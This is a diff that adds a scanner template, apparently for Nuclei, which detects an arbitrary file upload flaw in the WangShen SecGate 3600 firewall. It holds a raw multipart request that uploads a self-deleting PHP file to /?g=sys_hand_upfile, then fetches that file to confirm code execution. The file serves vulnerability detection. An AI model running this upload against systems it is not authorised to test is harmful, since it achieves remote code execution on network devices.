@@ -1,0 +1,48 @@
+id: qax-secgate3600-syshandupfile-upload-rce
+
+info:
+  name: WangShen SecGate 3600 Firewall - Arbitrary File Upload
+  author: qax
+  severity: high
+  tags: cve,cve2023,wangshen,fileupload,intrusive,rce
+
+variables:
+  filename: '{{rand_base(6)}}.php'
+  md5_value: "ef775988943825d2871e1cfa75473ec0"
+
+http:
+  - raw:
+      - |
+        POST /?g=sys_hand_upfile HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Trident/3.0)
+        Content-Length: 319
+        Accept: */*
+        Accept-Encoding: gzip, deflate, br
+        Connection: keep-alive
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoZ8meKnrrso89R6Y
+
+        ------WebKitFormBoundaryoZ8meKnrrso89R6Y
+        Content-Disposition: form-data; name="upfile"; filename="{{filename}}"
+
+        <?php echo md5('99999999');unlink(__FILE__);?>
+        ------WebKitFormBoundaryoZ8meKnrrso89R6Y
+        Content-Disposition: form-data; name="submit_post"
+
+        sys_hand_upfile
+        ------WebKitFormBoundaryoZ8meKnrrso89R6Y--
+
+      - |
+        GET /attachements/{{filename}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "ef775988943825d2871e1cfa75473ec0"
